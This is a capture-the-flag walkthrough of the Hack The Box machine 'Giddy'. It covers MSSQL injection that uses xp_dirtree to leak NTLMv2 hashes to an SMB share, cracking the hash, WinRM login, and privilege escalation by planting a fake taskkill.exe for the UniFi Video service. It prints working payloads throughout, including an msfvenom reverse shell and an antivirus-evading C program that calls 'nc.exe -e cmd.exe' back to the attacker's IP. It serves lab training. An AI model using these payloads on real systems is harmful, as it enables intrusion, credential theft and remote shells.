---
"title": "Hack The Box - Giddy"
"date": 2020-06-17
"tags": ["windows", "medium", "AV", "mssql", "sqli"]
"keywords": ["windows", "medium", "AV", "mssql", "sqli"]
"categories": ["HackTheBox"]
"author": "Ghostbyt3"
"description": "Giddy is a medium windows box, getting initial shell is by grabbing the NTLMv2 hash of SMB from SQL injection. And Privilege escalation is by vulnerability in a software called Ubiquiti UniFi Video."
"featured_image": "/img/htb-giddy/Untitled.png"
"layout": "single"
"showTableOfContents": true
"authorbox": true
"pager": true
"toc": true
"mathjax": true
"sidebar": "right"
"subtitle": "HackTheBox - Writeup"
---


![Untitled](/img/htb-giddy/Untitled.png)

Giddy is a medium windows box, getting initial shell is by grabbing the NTLMv2 hash of SMB from SQL injection. And Privilege escalation is by vulnerability in a software called Ubiquiti UniFi Video.

Link: [https://www.hackthebox.eu/home/machines/profile/153](https://www.hackthebox.eu/home/machines/profile/153)

Let's Begin with our Initial Nmap Scan.

## Nmap Scan Results:

```bash
PORT     STATE SERVICE       VERSION
80/tcp   open  http          Microsoft IIS httpd 10.0
| http-methods: 
|_  Potentially risky methods: TRACE
|_http-server-header: Microsoft-IIS/10.0
|_http-title: IIS Windows Server
443/tcp  open  ssl/http      Microsoft IIS httpd 10.0
|_http-server-header: Microsoft-IIS/10.0
|_http-title: IIS Windows Server
| ssl-cert: Subject: commonName=PowerShellWebAccessTestWebSite
| Not valid before: 2018-06-16T21:28:55
|_Not valid after:  2018-09-14T21:28:55
|_ssl-date: 2020-06-17T04:06:16+00:00; +4m24s from scanner time.
| tls-alpn: 
|   h2
|_  http/1.1
3389/tcp open  ms-wbt-server Microsoft Terminal Services
| rdp-ntlm-info: 
|   Target_Name: GIDDY
|   NetBIOS_Domain_Name: GIDDY
|   NetBIOS_Computer_Name: GIDDY
|   DNS_Domain_Name: Giddy
|   DNS_Computer_Name: Giddy
|   Product_Version: 10.0.14393
|_  System_Time: 2020-06-17T04:05:45+00:00
| ssl-cert: Subject: commonName=Giddy
| Not valid before: 2020-06-16T04:00:16
|_Not valid after:  2020-12-16T04:00:16
|_ssl-date: 2020-06-17T04:06:16+00:00; +4m24s from scanner time.
5985/tcp open  http          Microsoft HTTPAPI httpd 2.0 (SSDP/UPnP)
|_http-server-header: Microsoft-HTTPAPI/2.0
|_http-title: Not Found
Warning: OSScan results may be unreliable because we could not find at least 1 open and 1 closed port
OS fingerprint not ideal because: Missing a closed TCP port so results incomplete
No OS matches for host
Network Distance: 2 hops
Service Info: OS: Windows; CPE: cpe:/o:microsoft:windows

Host script results:
```

## HTTP Enumeration

Its an Normal webpage. except the image there is nothing here. So decided to run Gobuster.

![Untitled](/img/htb-giddy/Untitled%201.png)

### Gobuster Scan

```bash
===============================================================
Gobuster v3.0.1
by OJ Reeves (@TheColonial) & Christian Mehlmauer (@_FireFart_)
===============================================================
[+] Url:            http://10.10.10.104
[+] Threads:        10
[+] Wordlist:       /usr/share/wordlists/dirb/big.txt
[+] Status codes:   200,204,301,302,307,401,403
[+] User Agent:     gobuster/3.0.1
[+] Timeout:        10s
===============================================================
2020/06/17 09:37:07 Starting gobuster
===============================================================
/aspnet_client (Status: 301)
/mvc (Status: 301)
/remote (Status: 302)
===============================================================
2020/06/17 09:45:40 Finished
===============================================================
```

`/remote` it asks me to change to HTTPS.

![Untitled](/img/htb-giddy/Untitled%202.png)

So I changed. It contains a Windows PowerShell Web Access interface

![Untitled](/img/htb-giddy/Untitled%203.png)

`/mvc`

![Untitled](/img/htb-giddy/Untitled%204.png)

While checking the webpage, The URL seems suspicious so I injected `'` at the end and it throw some Sql error 

![Untitled](/img/htb-giddy/Untitled%205.png)

## SQL injection

First I tried getting the list of databases.

![Untitled](/img/htb-giddy/Untitled%206.png)

```bash
[11:14:57] [INFO] the back-end DBMS is Microsoft SQL Server
back-end DBMS: Microsoft SQL Server 2016
[11:14:57] [INFO] fetching database names
available databases [5]:
[*] Injection
[*] master
[*] model
[*] msdb
[*] tempdb
```

I tried to dump some files and nothing seems like useful, so I started checking PayloadsofAllThings and got [this](https://github.com/swisskyrepo/PayloadsAllTheThings/blob/master/SQL%20Injection/MSSQL%20Injection.md#mssql-unc-path).

> MSSQL supports stacked queries so we can create a variable pointing to our IP address then use the `xp_dirtree` function to list the files in our SMB share and grab the NTLMv2 hash.

Thats seems interesting. So started smbserver in my machine.

```bash
root@kali:~# smbserver.py pub `pwd`   
Impacket v0.9.20 - Copyright 2019 SecureAuth Corporation

[*] Config file parsed
[*] Callback added for UUID 4B324FC8-1670-01D3-1278-5A47BF6EE188 V:3.0
[*] Callback added for UUID 6BFFD098-A112-3610-9833-46C3F87E345A V:1.0
[*] Config file parsed
[*] Config file parsed
[*] Config file parsed
```

Captured the request and send that to repeater and used this payload.

```bash
; use master; exec xp_dirtree '\\10.10.14.9\w0lf';--
```

![Untitled](/img/htb-giddy/Untitled%207.png)

Within a few seconds, I got the hit with the Stacy hashes.

```bash
root@kali:~# smbserver.py pub `pwd`   
Impacket v0.9.20 - Copyright 2019 SecureAuth Corporation

[*] Config file parsed
[*] Callback added for UUID 4B324FC8-1670-01D3-1278-5A47BF6EE188 V:3.0
[*] Callback added for UUID 6BFFD098-A112-3610-9833-46C3F87E345A V:1.0
[*] Config file parsed
[*] Config file parsed
[*] Config file parsed
[*] Incoming connection (10.10.10.104,49721)
[*] AUTHENTICATE_MESSAGE (GIDDY\Stacy,GIDDY)
[*] User GIDDY\Stacy authenticated successfully
[*] Stacy::GIDDY:4141414141414141:09b4c8a04e8d49fc359f999b80ecb8f8:0101000000000000002168046f44d601772508716f1fa565000000000100100045007a007600660049006f00410063000200100071004f0044006c0077006c005a006e000300100045007a007600660049006f00410063000400100071004f0044006c0077006c005a006e0007000800002168046f44d6010600040002000000080030003000000000000000000000000030000085a0bcf3663d90e9d623b230dc8a6708fb2abaaf70f07892c7ea28974dd95ac00a0010000000000000000000000000000000000009001e0063006900660073002f00310030002e00310030002e00310034002e003900000000000000000000000000
[-] TreeConnectAndX not found W0LF
[-] TreeConnectAndX not found W0LF
[*] AUTHENTICATE_MESSAGE (GIDDY\Stacy,GIDDY)
[*] User GIDDY\Stacy authenticated successfully
[*] Stacy::GIDDY:4141414141414141:f06711943a731690a5e79d7291d8b616:010100000000000080b700056f44d6010d0cfea879d58e55000000000100100045007a007600660049006f00410063000200100071004f0044006c0077006c005a006e000300100045007a007600660049006f00410063000400100071004f0044006c0077006c005a006e000700080080b700056f44d6010600040002000000080030003000000000000000000000000030000085a0bcf3663d90e9d623b230dc8a6708fb2abaaf70f07892c7ea28974dd95ac00a0010000000000000000000000000000000000009001e0063006900660073002f00310030002e00310030002e00310034002e003900000000000000000000000000
[-] TreeConnectAndX not found W0LF
[-] TreeConnectAndX not found W0LF
```

I cracked the hash using john

```bash
root@kali:~/CTF/HTB/Boxes/Giddy# john --wordlist=/usr/share/wordlists/rockyou.txt stacy.hash 
Using default input encoding: UTF-8
Loaded 1 password hash (netntlmv2, NTLMv2 C/R [MD4 HMAC-MD5 32/64])
Will run 8 OpenMP threads
Press 'q' or Ctrl-C to abort, almost any other key for status
xNnWo6272k7x     (Stacy)
```

### Using Responder

We can also user `responder` here 

```bash
root@kali:~# responder -I tun0
                                         __
  .----.-----.-----.-----.-----.-----.--|  |.-----.----.
  |   _|  -__|__ --|  _  |  _  |     |  _  ||  -__|   _|
  |__| |_____|_____|   __|_____|__|__|_____||_____|__|
                   |__|

           NBT-NS, LLMNR & MDNS Responder 3.0.0.0

  Author: Laurent Gaffie (laurent.gaffie@gmail.com)
  To kill this script hit CTRL-C

[+] Poisoners:
    LLMNR                      [ON]
    NBT-NS                     [ON]
    DNS/MDNS                   [ON]

[+] Servers:
    HTTP server                [ON]
    HTTPS server               [ON]
    WPAD proxy                 [OFF]
    Auth proxy                 [OFF]
    SMB server                 [ON]
    Kerberos server            [ON]
    SQL server                 [ON]
    FTP server                 [ON]
    IMAP server                [ON]
    POP3 server                [ON]
    SMTP server                [ON]
    DNS server                 [ON]
    LDAP server                [ON]
    RDP server                 [ON]

[+] HTTP Options:
    Always serving EXE         [OFF]
    Serving EXE                [OFF]
    Serving HTML               [OFF]
    Upstream Proxy             [OFF]

[+] Poisoning Options:
    Analyze Mode               [OFF]
    Force WPAD auth            [OFF]
    Force Basic Auth           [OFF]
    Force LM downgrade         [OFF]
    Fingerprint hosts          [OFF]

[+] Generic Options:
    Responder NIC              [tun0]
    Responder IP               [10.10.14.9]
    Challenge set              [random]
    Don't Respond To Names     ['ISATAP']

[+] Listening for events...
[SMB] NTLMv2-SSP Client   : 10.10.10.104
[SMB] NTLMv2-SSP Username : GIDDY\Stacy
[SMB] NTLMv2-SSP Hash     : Stacy::GIDDY:0f7b1c386378170c:AB85DABAB76A635227827447CC5268EC:0101000000000000C0653150DE09D20119DA4185143111FD000000000200080053004D004200330001001E00570049004E002D00500052004800340039003200520051004100460056000400140053004D00420033002E006C006F00630061006C0003003400570049004E002D00500052004800340039003200520051004100460056002E0053004D00420033002E006C006F00630061006C000500140053004D00420033002E006C006F00630061006C0007000800C0653150DE09D2010600040002000000080030003000000000000000000000000030000085A0BCF3663D90E9D623B230DC8A6708FB2ABAAF70F07892C7EA28974DD95AC00A0010000000000000000000000000000000000009001E0063006900660073002F00310030002E00310030002E00310034002E003900000000000000000000000000
[*] Skipping previously captured hash for GIDDY\Stacy
[*] Skipping previously captured hash for GIDDY\Stacy
[*] Skipping previously captured hash for GIDDY\Stacy
[+] Exiting...
```

## Getting User shell

We know `/remote` is running a Windows Powershell Web so I tried login with the credentials `stacy : xNnWo6272k7x`.

![Untitled](/img/htb-giddy/Untitled%208.png)

It worked

![Untitled](/img/htb-giddy/Untitled%209.png)

With the credentials I tried login in `evil-winrm` and It worked.

```bash
root@kali:~/CTF/HTB/Boxes/Giddy# evil-winrm -i 10.10.10.104 -u stacy -p 'xNnWo6272k7x'

Evil-WinRM shell v2.3

Info: Establishing connection to remote endpoint

*Evil-WinRM* PS C:\Users\Stacy\Documents> whoami
giddy\stacy
```

## Privilege Escalation

When searching through the folders, I found `unifivideo`

```bash
*Evil-WinRM* PS C:\Users\Stacy\Documents> ls

    Directory: C:\Users\Stacy\Documents

Mode                LastWriteTime         Length Name
----                -------------         ------ ----
-a----        6/17/2018   9:36 AM              6 unifivideo
```

> UniFi Video is a powerful and flexible, integrated IP video management surveillance system designed to work with Ubiquiti’s UniFi Video Camera product line. UniFi Video has an intuitive, configurable, and feature‑packed user interface with advanced features such as motion detection, auto‑discovery, user-level security, storage management, reporting, and mobile device support.

I searched for any exploits available and found this.

> [https://www.exploit-db.com/exploits/43390](https://www.exploit-db.com/exploits/43390)

First let's check the directory is present or not.

```bash
*Evil-WinRM* PS C:\Users\Stacy\Documents> cd C:\ProgramData\unifi-video\
*Evil-WinRM* PS C:\ProgramData\unifi-video> ls

    Directory: C:\ProgramData\unifi-video

Mode                LastWriteTime         Length Name
----                -------------         ------ ----
d-----        6/16/2018   9:54 PM                bin
d-----        6/16/2018   9:55 PM                conf
d-----        6/16/2018  10:56 PM                data
d-----        6/16/2018   9:54 PM                email
d-----        6/16/2018   9:54 PM                fw
d-----        6/16/2018   9:54 PM                lib
d-----        6/17/2020  12:04 AM                logs
d-----        6/16/2018   9:55 PM                webapps
d-----        6/16/2018   9:55 PM                work
-a----        7/26/2017   6:10 PM         219136 avService.exe
-a----        6/17/2018  11:23 AM          31685 hs_err_pid1992.log
-a----        6/17/2018  11:23 AM      534204321 hs_err_pid1992.mdmp
-a----        8/16/2018   7:47 PM              0 hs_err_pid2036.mdmp
-a----        6/16/2018   9:54 PM            780 Ubiquiti UniFi Video.lnk
-a----        7/26/2017   6:10 PM          48640 UniFiVideo.exe
-a----        7/26/2017   6:10 PM          32038 UniFiVideo.ico
-a----        6/16/2018   9:54 PM          89050 Uninstall.exe
```

According to exploitdb Ubiquiti UniFi Video tries to execute a file called `taskkill.exe` in `C:\ProgramData\unifi-video\` but there is no file exists here. So we can place our payload as `taskkill.exe` then restart the service. And because the service runs with privileged permissions , it will be excuted as administrator.

Created a payload using msfvenom

```bash
root@kali:~/CTF/HTB/Boxes/Giddy# msfvenom -p windows/shell_reverse_tcp LHOST=10.10.14.9 LPORT=1234 -f exe > taskkill.exe
[-] No platform was selected, choosing Msf::Module::Platform::Windows from the payload
[-] No arch selected, selecting arch: x86 from the payload
No encoder specified, outputting raw payload
Payload size: 324 bytes
Final size of exe file: 73802 bytes
```

Started smb share in my machine and uploaded the `taskkill.exe` to the machine

![Untitled](/img/htb-giddy/Untitled%2010.png)

I tried to copy the file to `C:\ProgramData\unifi-video\` but it seems deleted. I think there is some kind of AV blocking this.

```bash
*Evil-WinRM* PS C:\Users\Stacy\Documents> copy taskkill.exe C:\ProgramData\unifi-video\
Cannot find path 'C:\Users\Stacy\Documents\taskkill.exe' because it does not exist.
At line:1 char:1
+ copy taskkill.exe C:\ProgramData\unifi-video\
+ ~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~
    + CategoryInfo          : ObjectNotFound: (C:\Users\Stacy\Documents\taskkill.exe:String) [Copy-Item], ItemNotFoundException
    + FullyQualifiedErrorId : PathNotFound,Microsoft.PowerShell.Commands.CopyItemCommand
*Evil-WinRM* PS C:\Users\Stacy\Documents> ls

    Directory: C:\Users\Stacy\Documents

Mode                LastWriteTime         Length Name
----                -------------         ------ ----
-a----        6/17/2020   2:52 AM             15 query
-a----        6/17/2018   9:36 AM              6 unifivideo
```

### Evading Antivirus

Since its blocking my payload I created a simple C program and compiled as exe that uses nc.exe and gives me shell.

```c
#include[stdio.h](stdio.h)
#include[stdlib.h](stdlib.h)

int main()
{
  system("nc.exe -e cmd.exe 10.10.14.9 1234");
  return 0;
}
```

Started my SMB share again and uploaded `nc.exe` and `taskkill.exe` to the box.

```c
*Evil-WinRM* PS C:\ProgramData\unifi-video> net use z: \\10.10.14.9\pub
The command completed successfully.

*Evil-WinRM* PS C:\ProgramData\unifi-video> copy z:\nc.exe .
*Evil-WinRM* PS C:\ProgramData\unifi-video> copy z:\taskkill.exe .
```

I tried to see the service but it don't have much privilege for that. After some googling I found that.

```c
*Evil-WinRM* PS C:\ProgramData\unifi-video> Get-Service
Cannot open Service Control Manager on computer '.'. This operation might require other privileges.
At line:1 char:1
+ Get-Service
+ ~~~~~~~~~~~
    + CategoryInfo          : NotSpecified: (:) [Get-Service], InvalidOperationException
    + FullyQualifiedErrorId : System.InvalidOperationException,Microsoft.PowerShell.Commands.GetServiceCommand

*Evil-WinRM* PS C:\ProgramData\unifi-video> Stop-Service  "Ubiquiti UniFi Video"
Warning: Waiting for service 'Ubiquiti UniFi Video (UniFiVideoService)' to stop...
Warning: Waiting for service 'Ubiquiti UniFi Video (UniFiVideoService)' to stop...
Warning: Waiting for service 'Ubiquiti UniFi Video (UniFiVideoService)' to stop...
Warning: Waiting for service 'Ubiquiti UniFi Video (UniFiVideoService)' to stop...
Warning: Waiting for service 'Ubiquiti UniFi Video (UniFiVideoService)' to stop...
Warning: Waiting for service 'Ubiquiti UniFi Video (UniFiVideoService)' to stop...
*Evil-WinRM* PS C:\ProgramData\unifi-video> Start-Service  "Ubiquiti UniFi Video"
```

Restarted the service 

I got the shell

```c
root@kali:~/CTF/HTB/Boxes/Giddy# nc -lnvp 1234
listening on [any] 1234 ...
connect to [10.10.14.9] from (UNKNOWN) [10.10.10.104] 49757
Microsoft Windows [Version 10.0.14393]
(c) 2016 Microsoft Corporation. All rights reserved.

C:\ProgramData\unifi-video>whoami
whoami
nt authority\system

C:\ProgramData\unifi-video>cd C:\Users
cd C:\Users

C:\Users>cd Administrator
cd Administrator

C:\Users\Administrator>cd Desktop
cd Desktop

C:\Users\Administrator\Desktop>type root.txt
type root.txt
```

We Own the System

Refernce:

- [https://community.ui.com/questions/UniFi-Video-as-Windows-Service/60f620a2-59de-4693-b131-da995e30cc27](https://community.ui.com/questions/UniFi-Video-as-Windows-Service/60f620a2-59de-4693-b131-da995e30cc27)
- [http://www.onlinecompiler.net/fortran](http://www.onlinecompiler.net/fortran)